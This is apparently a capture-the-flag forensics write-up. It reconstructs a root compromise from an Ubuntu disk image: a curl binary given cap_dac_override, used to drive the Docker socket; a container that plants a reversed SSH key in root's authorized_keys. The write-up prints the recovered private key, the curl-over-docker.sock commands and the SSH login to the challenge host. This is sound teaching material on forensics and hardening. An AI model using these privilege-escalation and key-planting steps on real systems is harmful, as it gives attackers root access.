# Authorized Whale (Forensics, bn256)

**Flag:** `CPCTF{9r0t3ct_y0ur_d0ck3r_s0ck3t_str1ctLy}`

## Setup

- 8 GiB raw disk image of an Ubuntu 24.04 box that was just compromised.
- Live SSH target: `133.88.122.244:32222` (publickey-only).
- Goal: reconstruct the attack from the image, then perform it against the live target.

## Forensics

Extract the ext4 partition (GPT part 2, offset 2 MiB) and browse with `pytsk3` / `debugfs` / `fls` / `icat`.

### 1. The admin's own diary spells out the mistake

`/var/www/html/index.html` brags about setting `cap_dac_override+ep` on `/usr/bin/curl` — a "clever workaround" so an unprivileged user can hit `/var/run/docker.sock` without being in the `docker` group. Confirmed on disk:

```shell
$ debugfs -R 'ea_get /usr/bin/curl security.capability' part.img
security.capability (20) = 01 00 00 02 02 00 00 00 …
                           ^^^^^^^^^^^  ^^
                           revision=2   permitted = 0x2 = CAP_DAC_OVERRIDE
                           effective flag set (0x01 in magic)
```

With that capability, `curl` bypasses all DAC checks — **any user can**:

- `curl --unix-socket /var/run/docker.sock http://.../containers/create …` to drive the Docker daemon as root, or
- `curl file:///root/flag.txt` directly.

### 2. Root's authorized_keys was tampered with

`/root/.ssh/authorized_keys` (mtime 17:39:27, attack window):

```text
command="cat /root/flag.txt",no-pty,no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKZop8lFBVr7WU34SAutXs9gESNMbNzPa9KKcnCmAtW
```

`/home/ctf-player/.bash_history`:

```shell
ssh -i /dev/shm/id_ed25519 root@localhost
```

So the attacker: generated a keypair in `/dev/shm`, wrote the public key into `root@localhost:~/.ssh/authorized_keys` with a forced-command, and immediately SSH'd in to harvest the flag. `/dev/shm` is tmpfs — the **private key is not on disk** as a regular file.

### 3. Pulling the private key out of Docker's state JSON

Scanning the raw image for `openssh-key-v1` / `FKZop8l…` / `-----BEGIN OPENSSH PRIVATE KEY-----` yields, among other hits, a string of Docker container state files under `/var/lib/docker/containers/*/config.v2.json` and `hostconfig.json`. One of these containers:

- **Bind:** `/root:/host_root`
- **Cmd:** `sh -c 'echo "$PUB_PAYLOAD" | rev >> /host_root/.ssh/authorized_keys'`
- **Env:**
  - `PUB_PAYLOAD= WtAmCncKK9aPzNbMNSEg9sXtuAS43UW7rVBFl8poZKFIAAAA5ETN1IDZl1CazN3CAAAA 91552de-hss`
  - `PRIV_PAYLOAD=K0SLt0SL…RDR1C1SLt0SL` *(long blob)*

`rev(PUB_PAYLOAD)` → `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKZop8l…` — the exact key installed in `authorized_keys`.

`rev(PRIV_PAYLOAD)` is base64 of a PEM block:

```python
import base64
print(base64.b64decode(PRIV_PAYLOAD[::-1]).decode())
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBSmaKfJRQVa+1lN+EgLrV7PYBEjTGzcz2vSinJwpgLVgAAAIi26rMstuqz
LAAAAAtzc2gtZWQyNTUxOQAAACBSmaKfJRQVa+1lN+EgLrV7PYBEjTGzcz2vSinJwpgLVg
AAAEBVKMBWCFLfBFrlkqpwU+W5YqQqSgbahBCqfHgmZoVMm1KZop8lFBVr7WU34SAutXs9
gESNMbNzPa9KKcnCmAtWAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
```

`ssh-keygen -y -f` on this yields `ssh-ed25519 …IFKZop8l…` — **matches the authorized_keys entry exactly**.

> The `config.v2.json` files even survive `docker rm`. `/var/lib/docker/containers/<id>/` gets unlinked, but the 4-KiB data blocks are still present in unallocated space, which is why scanning the raw image finds them.

## Exploit

```bash
cat > ~/.ssh/attacker <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBSmaKfJRQVa+1lN+EgLrV7PYBEjTGzcz2vSinJwpgLVgAAAIi26rMstuqz
LAAAAAtzc2gtZWQyNTUxOQAAACBSmaKfJRQVa+1lN+EgLrV7PYBEjTGzcz2vSinJwpgLVg
AAAEBVKMBWCFLfBFrlkqpwU+W5YqQqSgbahBCqfHgmZoVMm1KZop8lFBVr7WU34SAutXs9
gESNMbNzPa9KKcnCmAtWAAAAAAECAwQF
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 ~/.ssh/attacker

ssh -i ~/.ssh/attacker -o IdentitiesOnly=yes -p 32222 root@133.88.122.244
```

```shell
PTY allocation request failed on channel 0
CPCTF{9r0t3ct_y0ur_d0ck3r_s0ck3t_str1ctLy}
```

The `command=`/`no-pty` restrictions in `authorized_keys` kick in — `cat /root/flag.txt` runs, flag prints, session closes.

## Notes

- `cap_dac_override` is **not** `cap_sys_admin`. It silently hands an unprivileged user full read/write over every file on the box, including sockets. Don't slap it on ubiquitous tools like `curl`.
- The disk image had **ten+** docker container records like this one, each from a different player's attack — all in unallocated space. Any of them would have worked against the corresponding live instance; the pub key in the `/host_root/.ssh/authorized_keys` container (not the `/tmp`-bound throwaways) is the one to match.
- `rev` reversal was pure obfuscation so the payload wouldn't look like a base64 PEM to a casual `grep`. Decoding is trivial once you spot the `...K0tLS0tLS0-` tail — which is `-----` + newline reversed.
